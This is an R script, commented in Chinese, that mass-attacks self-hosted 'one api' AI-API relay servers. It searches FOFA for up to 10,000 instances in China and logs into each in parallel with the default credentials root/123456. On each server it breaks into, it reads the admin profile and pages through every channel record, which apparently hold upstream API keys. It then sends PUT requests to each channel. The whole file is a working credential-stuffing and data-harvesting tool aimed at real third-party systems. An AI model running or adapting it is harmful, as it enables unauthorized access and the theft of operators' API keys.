library(httr)
library(jsonlite)
library(furrr)
library(future)
library(dplyr)
library(purrr)

#-------------------------------------------------------
# Chapter:使用fofa扫one api---主要为了获取url变量
#-------------------------------------------------------

# 设置代理
proxy_url <- "http://127.0.0.1:7890"

# API请求URL
url <- "https://fofa.info/api/v1/search/all"

# 查询参数:返回信息为link，返回条目数为1000，full=T表示不限时间
params <- list(
  key = fofa_key,
  qbase64 = base64encode(charToRaw('title="one api" && country="CN"')), #请求转化为base64编码
  fields = "link",
  size = 10000,
  full = "true"
)

# 发送GET请求
response <- GET(
  url,
  query = params,
  use_proxy(proxy_url, 7890),
  config(ssl_verifypeer = FALSE)
)

# 检查请求是否成功
if (status_code(response) == 200) {
  # 解析JSON响应
  content <- content(response, "text", encoding = "UTF-8")
  data <- fromJSON(content)
  
  # 提取link向量
  url <- data$results
  
  # 打印结果
  print(url)
} else {
  cat("请求失败，状态码：", status_code(response))
}

#-------------------------------------------------------
# Chapter:进行批量访问--主要使用上一步的url变量批量请求以获取没有修改密码的url
#-------------------------------------------------------
# 设置多线程计划，使用所有可用的CPU核，这里用10个线程
plan(multisession,workers=10)

# 你的oneapi站点，不要有斜杠
url

# 根据网页请求模拟登录
login <- function(username, password, url=NULL) {
  data <- list(
    username = username,
    password = password
  )
  last_url <- modify_url(url, path = "/api/user/login", query = list(turnstile = ""))
  
  resp <- POST(last_url, 
               handle = handle(url),
               body = data,
               encode = "json",
               timeout(3),
               config(ssl_verifypeer = FALSE))
  
  if (status_code(resp) == 200) {
    content <- content(resp, "parsed")
    if (content$success) {
      # print(paste("登录成功：", url))
      url
    }
  }
}

# 使用safely来包装login函数，防止报错使循环中断
safe_login <- safely(login)

# 对URL列表应用并行登录函数
results <- future_map(url, ~safe_login("root", "123456", url = .), .progress = TRUE)

url<-sapply(results,function(x){if(!is.null(x$result)){x$result}else{return("error")}})%>%.[.!="error"]


#-------------------------------------------------------
# Chapter:获取漏洞url中的所有渠道信息
#-------------------------------------------------------

# 使用 lapply 并结合 tryCatch 进行错误处理
put_response_list <- lapply(url, function(my_url) {
  # 使用 tryCatch 捕获整个迭代过程中的错误
  tryCatch({
    message("开始处理 URL: ", my_url)
    
    # 登录凭证
    myroot <- "root"
    mypwd <- "123456"
    
    # 定义 Cookie 存储文件
    COOKIE_FILE <- tempfile(pattern = "cookies_", fileext = ".txt")
    
    # 步骤 1：登录并保存 Cookie
    login_url <- paste0(my_url, '/api/user/login')
    
    login_response <- POST(
      url = login_url,
      add_headers(
        `sec-ch-ua-platform` = '"Windows"',
        Referer = paste0(my_url, '/login'),
        `User-Agent` = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        Accept = 'application/json, text/plain, */*',
        `sec-ch-ua` = '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        `Content-Type` = 'application/json',
        `sec-ch-ua-mobile` = '?0'
      ),
      body = list(
        username = myroot,
        password = mypwd
      ),
      encode = "json",
      config = config(
        cookiejar = COOKIE_FILE,  # 保存 Cookie 到文件
        accept_encoding = "gzip"  # 支持压缩
      )
    )
    
    # 检查登录是否成功
    if (http_error(login_response)) {
      stop("登录请求失败: ", status_code(login_response), 
           "\n响应内容: ", content(login_response, as = "text", encoding = "UTF-8"))
    } else {
      message("登录成功，Cookie 已保存到 ", COOKIE_FILE)
    }
    
    # 步骤 2：使用保存的 Cookie 获取用户信息
    user_info_url <- paste0(my_url, '/api/user/self')
    
    user_info_response <- GET(
      url = user_info_url,
      add_headers(
        `sec-ch-ua-platform` = '"Windows"',
        Referer = paste0(my_url, '/panel'),
        `User-Agent` = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        Accept = 'application/json, text/plain, */*',
        `sec-ch-ua` = '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        `sec-ch-ua-mobile` = '?0'
      ),
      config = config(
        cookiefile = COOKIE_FILE,  # 使用之前保存的 Cookie
        accept_encoding = "gzip"    # 支持压缩
      )
    )
    
    # 检查获取用户信息是否成功
    if (http_error(user_info_response)) {
      stop("获取用户信息请求失败: ", status_code(user_info_response), 
           "\n响应内容: ", content(user_info_response, as = "text", encoding = "UTF-8"))
    } else {
      message("成功获取用户信息")
    }
    
    response_content <- content(user_info_response, as = "text", encoding = "UTF-8")
    
    # 可选：显示获取到的用户信息
    cat("用户信息:\n")
    cat(response_content, "\n\n")
    
    # 步骤 3：获取所有频道的列表并提取频道 ID
    get_all_channels <- function(base_url, cookie_file) {
      all_channels <- list()
      page <- 0
      repeat {
        message("获取频道列表，第 ", page + 1, " 页")
        channels_url <- paste0(base_url, "?p=", page)
        
        channels_response <- GET(
          url = channels_url,
          add_headers(
            `Accept` = 'application/json, text/plain, */*',
            `Accept-Language` = 'zh-CN,zh;q=0.9,ja;q=0.8',
            `Priority` = 'u=1, i',
            Referer = paste0(my_url, '/panel/channel'),
            `sec-ch-ua` = '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            `sec-ch-ua-mobile` = '?0',
            `sec-ch-ua-platform` = '"Windows"',
            `sec-fetch-dest` = 'empty',
            `sec-fetch-mode` = 'cors',
            `sec-fetch-site` = 'same-origin',
            `User-Agent` = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
          ),
          config = config(
            cookiefile = cookie_file,  # 使用之前保存的 Cookie
            accept_encoding = "gzip"    # 支持压缩
          )
        )
        
        # 检查获取频道列表是否成功
        if (http_error(channels_response)) {
          stop("获取频道列表请求失败: ", status_code(channels_response), 
               "\n响应内容: ", content(channels_response, as = "text", encoding = "UTF-8"))
        }
        
        message("成功获取第 ", page + 1, " 页频道列表")
        
        channels_content <- content(channels_response, as = "text", encoding = "UTF-8")
        
        # 解析渠道列表 JSON，以提取频道列表
        channels_data <- fromJSON(channels_content, simplifyVector = TRUE)
        
        if (!is.null(channels_data$data) && length(channels_data$data) > 0) {
          all_channels[[page + 1]] <- channels_data$data
          message("当前页获取到 ", length(channels_data$data), " 个频道")
          # 继续下一页
          page <- page + 1
        } else {
          message("第 ", page + 1, " 页没有更多频道，停止遍历")
          break
        }
      }
      # 提取所有频道的 ID
      # 假设每个频道的数据中包含一个 'id' 字段
      channel_ids <- sapply(all_channels, function(channel_page) {
        if (!is.null(channel_page$id)) {
          return(channel_page$id)
        } else {
          return(NULL)
        }
      })
      channel_ids <- unlist(channel_ids)
      
      return(channel_ids)
    }
    
    # 获取所有频道的 ID
    channels_api_url <- paste0(my_url, '/api/channel/')
    all_channel_ids <- get_all_channels(channels_api_url, COOKIE_FILE)
    
    message("总共获取到 ", length(all_channel_ids), " 个频道")
    
    # 如果没有获取到任何频道，跳过后续操作
    if (length(all_channel_ids) == 0) {
      warning("没有获取到任何频道，跳过 PUT 请求的执行。")
      return(NULL)
    }
    
    # 将频道 ID 和名称放入数据框（请确保有频道名称的信息，如果没有，可以调整此部分）
    channels_df <- data.frame(
      id = all_channel_ids,
      name = paste0("Channel", seq_along(all_channel_ids)),
      stringsAsFactors = FALSE
    )
    
    # 步骤 4：遍历所有频道并执行 PUT 请求以更新频道信息
    # 初始化一个列表存储所有 PUT 响应
    put_response_df <- list()
    
    # 定义 PUT 请求的基础 URL
    put_url <- paste0(my_url, '/api/channel/')
    
    # 遍历所有频道
    for (i in seq_along(all_channel_ids)) {
      channel_id <- all_channel_ids[i]
      channel_name <- channels_df$name[i]  # 使用 channels_df 中的名称
      message("更新频道 ", i, "/", length(all_channel_ids), " - ID: ", channel_id, ", 名称: ", channel_name)
      
      # 定义 PUT 请求的 JSON 数据
      put_data <- list(
        id = channel_id
        # 根据 API 需求，可能还需要添加其他字段
      )
      
      # 将列表转换为 JSON 字符串
      put_data_json <- toJSON(put_data, auto_unbox = TRUE, pretty = TRUE)
      
      # 发送 PUT 请求
      put_response <- PUT(
        url = put_url,
        add_headers(
          `sec-ch-ua-platform` = '"Windows"',
          Referer = paste0(my_url, '/panel/channel'),
          `User-Agent` = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
          Accept = 'application/json, text/plain, */*',
          `sec-ch-ua` = '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
          `Content-Type` = 'application/json',
          `sec-ch-ua-mobile` = '?0'
        ),
        body = put_data_json,
        encode = "json",
        config = config(
          cookiefile = COOKIE_FILE,  # 使用之前保存的 Cookie
          accept_encoding = "gzip"    # 支持压缩
        )
      )
      
      # 解析 PUT 响应
      put_response_content <- content(put_response, as = "text", encoding = "UTF-8")
      
      # 尽量安全地解析 JSON，避免因解析错误中断流程
      put_response_json <- tryCatch({
        fromJSON(put_response_content, simplifyVector = TRUE)
      }, error = function(e) {
        warning("无法解析 PUT 请求的响应 JSON: ", e$message)
        return(NULL)
      })
      # 检查 PUT 请求是否成功
      if (http_error(put_response)) {
        message("PUT 请求失败: ", status_code(put_response))
        # 根据需求，您可能希望将响应内容也记录下来
        response_record <- list(
          channel_id = channel_id,
          request_number = i,
          status_code = status_code(put_response),
          response_content = put_response_content,
          error = TRUE
        )
      } else if (!is.null(put_response_json)) {
        # 将所有响应字段保存在记录中
        put_response_json$channel_id <- channel_id
        response_record <- put_response_json
        message("PUT 请求成功，频道信息已更新")
      } else {
        response_record <- list(
          channel_id = channel_id,
          request_number = i,
          response_content = put_response_content,
          error = TRUE,
          message = "响应解析失败"
        )
        message("PUT 请求响应解析失败。")
      }
      
      # 将响应添加到列表
      put_response_df[[i]] <- response_record
      
      # 可选：延迟以避免过于频繁的请求
      Sys.sleep(0.5)  # 暂停 0.5 秒
    }
    
    # 将列表转换为数据框
    put_response_df <- bind_rows(lapply(put_response_df, as.data.frame))
    put_response_df$url<- my_url
    
    # 返回 PUT 请求的响应数据框
    return(put_response_df)
    
  }, error = function(e) {
    # 捕获并返回错误信息，而不是中断整个 lapply
    warning("在处理 URL ", my_url, " 时发生错误: ", e$message)
    return(NULL)
  })
})

# 如果需要，可以将结果合并为一个数据框
combined_put_responses <- do.call(rbind, put_response_list)

# 查看合并后的 PUT 请求响应
print(combined_put_responses)

